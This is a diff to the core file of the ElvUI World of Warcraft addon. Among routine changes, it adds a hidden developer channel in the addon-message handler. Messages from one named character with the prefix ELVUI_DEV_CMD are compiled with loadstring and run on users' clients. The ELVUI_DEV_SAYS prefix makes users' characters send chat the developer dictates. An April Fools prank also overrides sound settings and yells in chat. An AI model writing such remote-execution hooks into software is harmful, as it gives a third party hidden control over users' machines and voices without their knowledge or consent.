@@ -1,23 +1,24 @@
 local E, L, V, P, G, _ = unpack(select(2, ...)); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB, Localize Underscore
 local LSM = LibStub("LibSharedMedia-3.0")
-local _, ns = ...
-local ElvUF = ns.oUF
 
+local format = string.format
 local find = string.find
 local split = string.split
 local match = string.match
-local wipe = table.wipe
+local twipe = table.wipe
 
 --Constants
-_, E.myclass = UnitClass("player");
-E.myname, _ = UnitName("player");
+E.myclass = select(2, UnitClass("player"));
+E.myrace = select(2, UnitRace("player"))
+E.myname = UnitName("player");
 E.myguid = UnitGUID('player');
 E.version = GetAddOnMetadata("ElvUI", "Version"); 
 E.myrealm = GetRealmName();
-_, E.wowbuild = GetBuildInfo(); E.wowbuild = tonumber(E.wowbuild);
+E.wowbuild = select(2, GetBuildInfo()); E.wowbuild = tonumber(E.wowbuild);
 E.resolution = GetCVar("gxResolution")
 E.screenheight = tonumber(match(E.resolution, "%d+x(%d+)"))
 E.screenwidth = tonumber(match(E.resolution, "(%d+)x+%d"))
+E.isMacClient = IsMacClient()
 
 --Tables
 E["media"] = {};
@@ -42,7 +43,8 @@ E.InversePoints = {
 	LEFT = 'RIGHT',
 	RIGHT = 'LEFT',
 	BOTTOMLEFT = 'TOPLEFT',
-	BOTTOMRIGHT = 'TOPRIGHT'
+	BOTTOMRIGHT = 'TOPRIGHT',
+	CENTER = 'CENTER'
 }
 
 E.DispelClasses = {
@@ -235,7 +237,7 @@ end
 
 function E:UpdateFrameTemplates()
 	for frame, _ in pairs(self["frames"]) do
-		if frame and frame.template  then
+		if frame and frame.template and not frame.ignoreUpdates then
 			frame:SetTemplate(frame.template, frame.glossTex);
 		else
 			self["frames"][frame] = nil;
@@ -410,9 +412,9 @@ end
 function E:SendMessage()
 	local _, instanceType = IsInInstance()
 	if IsInRaid() then
-		SendAddonMessage("ElvUIVC", E.version, (not IsInRaid(LE_PARTY_CATEGORY_HOME) and IsInRaid(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "RAID")
+		SendAddonMessage("ELVUI_VERSION", E.version, (not IsInRaid(LE_PARTY_CATEGORY_HOME) and IsInRaid(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "RAID")
 	elseif IsInGroup() then
-		SendAddonMessage("ElvUIVC", E.version, (not IsInGroup(LE_PARTY_CATEGORY_HOME) and IsInGroup(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "PARTY")
+		SendAddonMessage("ELVUI_VERSION", E.version, (not IsInGroup(LE_PARTY_CATEGORY_HOME) and IsInGroup(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "PARTY")
 	end
 	
 	if E.SendMSGTimer then
@@ -421,29 +423,74 @@ function E:SendMessage()
 	end
 end
 
+local frames = {}
 local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname then return end
 
-		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not find(sender, "Elvz%-Spirestone") and not E.recievedOutOfDateMessage then
+		if prefix == "ELVUI_VERSION" and not find(sender, "Elvz") and not E.recievedOutOfDateMessage then
 			if E.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(E.version) then
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
 				E.recievedOutOfDateMessage = true
 			end
-		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Spirestone") or find(sender, "Elvz%-Spirestone")) then ---HAHHAHAHAHHA
-			local user, channel, msg, sendTo = split(',', message)
-			
-			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-				SendChatMessage(msg, channel, nil, sendTo)
+		elseif (prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and ((sender == 'Elvz' and E.myrealm == "Spirestone") or find(sender, "Elvz%-Spirestone")) then
+			if prefix == 'ELVUI_DEV_SAYS' then
+				local user, channel, msg, sendTo = split("#", message)
+				
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+					SendChatMessage(msg, channel, nil, sendTo)
+				end
+			else
+				local user, executeString = split("#", message)
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+					local func, err = loadstring(executeString);
+					if not err then
+						E:Print(format("Developer Executed: %s", executeString))
+						func()
+					end
+				end			
 			end
 		end
-	else
+	--[[elseif event == "ADDON_LOADED" then
+		if prefix == "ElvUI" then
+			local _, _, _, _, _, reason = GetAddOnInfo("ElvUI_SLE")
+			local frame = EnumerateFrames()
+			while frame do
+				if frame:IsEventRegistered("CHAT_MSG_ADDON") then
+					frames[frame] = true
+				end
+				frame = EnumerateFrames(frame)
+			end
+
+			if reason ~= "MISSING" and reason ~= "DISABLED" then 
+				LoadAddon("ElvUI_SLE")
+			else
+				twipe(frames)
+				self:UnregisterEvent("ADDON_LOADED")
+			end
+		elseif prefix == "ElvUI_SLE" then
+			local frame = EnumerateFrames()
+			while frame do
+				if frame:IsEventRegistered("CHAT_MSG_ADDON") and not frames[frame] then
+					frame:UnregisterEvent("CHAT_MSG_ADDON")
+				end
+				frame = EnumerateFrames(frame)
+			end
+			twipe(frames)
+			self:UnregisterEvent("ADDON_LOADED")
+		end
+	else]]
 		E.SendMSGTimer = E:ScheduleTimer('SendMessage', 12)
 	end
 end
 
+RegisterAddonMessagePrefix('ELVUI_VERSION')
+RegisterAddonMessagePrefix('ELVUI_DEV_SAYS')
+RegisterAddonMessagePrefix('ELVUI_DEV_CMD')
+
 local f = CreateFrame('Frame')
 f:RegisterEvent("GROUP_ROSTER_UPDATE")
+--f:RegisterEvent("ADDON_LOADED")
 f:RegisterEvent("CHAT_MSG_ADDON")
 f:SetScript('OnEvent', SendRecieve)
 
@@ -468,6 +515,7 @@ function E:UpdateAll(ignoreInstall)
 	local CH = self:GetModule('Chat')
 	CH.db = self.db.chat
 	CH:PositionChat(true); 
+	CH:SetupChat()
 	
 	local AB = self:GetModule('ActionBars')
 	AB.db = self.db.actionbar
@@ -595,7 +643,7 @@ end
 
 function E:RefreshModulesDB()
 	local UF = self:GetModule('UnitFrames')
-	wipe(UF.db)
+	twipe(UF.db)
 	UF.db = self.db.unitframe
 end
 
@@ -616,10 +664,97 @@ function E:DBConversions()
 
 end
 
+function E:StopMassiveShake()
+	E.isMassiveShaking = nil
+	StopMusic()
+	SetCVar("Sound_EnableAllSound", self.oldEnableAllSound)
+	SetCVar("Sound_EnableMusic", self.oldEnableMusic)
+	
+	self:StopShakeHorizontal(ElvUI_StaticPopup1)
+	for _, object in pairs(self["massiveShakeObjects"]) do
+		if object then
+			self:StopShake(object)
+		end
+	end
+
+	if E.massiveShakeTimer then
+		E:CancelTimer(E.massiveShakeTimer)
+	end
+
+	E.global.aprilFools = true;
+	E:StaticPopup_Hide("APRIL_FOOLS")
+	twipe(self.massiveShakeObjects)
+	DoEmote("Dance")
+end
+
+function E:MassiveShake()
+	E.isMassiveShaking = true
+	ElvUI_StaticPopup1Button1:Enable()
+	
+	for _, object in pairs(self["massiveShakeObjects"]) do
+		if object then
+			self:Shake(object)
+		end
+	end
+	
+	E.massiveShakeTimer = E:ScheduleTimer("StopMassiveShake", 42.5)
+	SendChatMessage("DO THE HARLEM SHAKE!", "YELL")
+end
+
+function E:BeginFoolsDayEvent()
+	DoEmote("Dance")
+	ElvUI_StaticPopup1Button1:Disable()
+	self:ShakeHorizontal(ElvUI_StaticPopup1)
+	self.oldEnableAllSound = GetCVar("Sound_EnableAllSound")
+	self.oldEnableMusic = GetCVar("Sound_EnableMusic")
+	
+	SetCVar("Sound_EnableAllSound", 1)
+	SetCVar("Sound_EnableMusic", 1)
+	PlayMusic([[Interface\AddOns\ElvUI\media\sounds\harlemshake.mp3]])
+	E:ScheduleTimer("MassiveShake", 15.5)
+	
+	local UF = E:GetModule("UnitFrames")
+	local AB = E:GetModule("ActionBars")
+	self.massiveShakeObjects = {}
+	tinsert(self.massiveShakeObjects, GameTooltip)
+	tinsert(self.massiveShakeObjects, Minimap)
+	tinsert(self.massiveShakeObjects, WatchFrame)
+	tinsert(self.massiveShakeObjects, LeftChatPanel)
+	tinsert(self.massiveShakeObjects, RightChatPanel)
+	tinsert(self.massiveShakeObjects,LeftChatToggleButton)
+	tinsert(self.massiveShakeObjects,RightChatToggleButton)
+	
+	for unit in pairs(UF['units']) do
+		tinsert(self.massiveShakeObjects, UF[unit])
+	end
+	
+	for _, header in pairs(UF['headers']) do
+		tinsert(self.massiveShakeObjects, header)
+	end	
+	
+	for _, bar in pairs(AB['handledBars']) do
+		for i=1, #bar.buttons do
+			tinsert(self.massiveShakeObjects, bar.buttons[i])
+		end
+	end
+
+	if ElvUI_StanceBar then
+		for i=1, #ElvUI_StanceBar.buttons do
+			tinsert(self.massiveShakeObjects, ElvUI_StanceBar.buttons[i])
+		end
+	end
+	
+	for i=1, NUM_PET_ACTION_SLOTS do
+		if _G["PetActionButton"..i] then
+			tinsert(self.massiveShakeObjects, _G["PetActionButton"..i])
+		end
+	end
+end
+
 function E:Initialize()
-	wipe(self.db)
-	wipe(self.global)
-	wipe(self.private)
+	twipe(self.db)
+	twipe(self.global)
+	twipe(self.private)
 	
 	self.data = LibStub("AceDB-3.0"):New("ElvDB", self.DF);
 	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
@@ -636,7 +771,6 @@ function E:Initialize()
 	self:CheckRole()
 	self:UIScale('PLAYER_LOGIN');
 
-	self:LoadConfig(); --Load In-Game Config
 	self:LoadCommands(); --Load Commands
 	self:InitializeModules(); --Load Modules	
 	self:LoadMovers(); --Load Movers
@@ -652,17 +786,9 @@ function E:Initialize()
 	end
 	
 	if E:IsFoolsDay() then
-		function GetMoney()
-			return 0;
-		end
-		E:Delay(45, function()
-			E:StaticPopup_Show('APRIL_FOOLS')
-		end)
+		E:StaticPopup_Show('APRIL_FOOLS')
 	end
-	
-	RegisterAddonMessagePrefix('ElvUIVC')
-	RegisterAddonMessagePrefix('ElvSays')
-	
+
 	self:UpdateMedia()
 	self:UpdateFrameTemplates()
 	self:RegisterEvent("ACTIVE_TALENT_GROUP_CHANGED", "CheckRole");
